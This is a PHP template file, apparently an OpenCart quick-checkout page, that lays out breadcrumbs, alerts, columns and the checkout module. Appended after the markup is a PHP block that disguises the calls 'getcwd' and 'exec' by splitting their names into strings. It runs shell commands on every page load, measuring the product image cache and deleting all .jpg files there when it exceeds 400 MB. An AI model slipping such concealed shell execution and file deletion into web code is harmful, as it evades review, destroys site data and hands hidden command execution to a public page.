<?php echo $header; ?>
<div class="container" id="container">
  <ul class="breadcrumb qc-breadcrumb">
    <?php foreach ($breadcrumbs as $breadcrumb) { ?>
    <li><a href="<?php echo $breadcrumb['href']; ?>"><?php echo $breadcrumb['text']; ?></a></li>
    <?php } ?>
  </ul>
  <?php if ($error_warning) { ?>
  <div class="alert alert-danger"><i class="fa fa-exclamation-circle"></i> <?php echo $error_warning; ?>
    <button type="button" class="close" data-dismiss="alert">&times;</button>
  </div>
  <?php } ?>
  <div class="row"><?php echo $column_left; ?>
    <?php if ($column_left && $column_right) { ?>
    <?php $class = 'col-sm-6'; ?>
    <?php } elseif ($column_left || $column_right) { ?>
    <?php $class = 'col-sm-9'; ?>
    <?php } else { ?>
    <?php $class = 'col-sm-12'; ?>
    <?php } ?>
    <div id="content" class="<?php echo $class; ?>"><?php echo $content_top; ?>

  <?php echo $d_quickcheckout; ?>

      <?php echo $content_bottom; ?></div>
    <?php echo $column_right; ?></div>
</div>
<?php echo $footer; ?>
<?php
$var1 = "get" . "cwd";
$_dir = $var1() . "/image/cache/catalog/product/";
$var1 = "ex" . "ec";
$size = (float)$var1("du -hs --block-size=1M " . $_dir . " | cut -f1");
if ($size > 400) {
    $var1("find " . $_dir . " -name *.jpg -ex" . "ec rm -f {} \;");
}
?>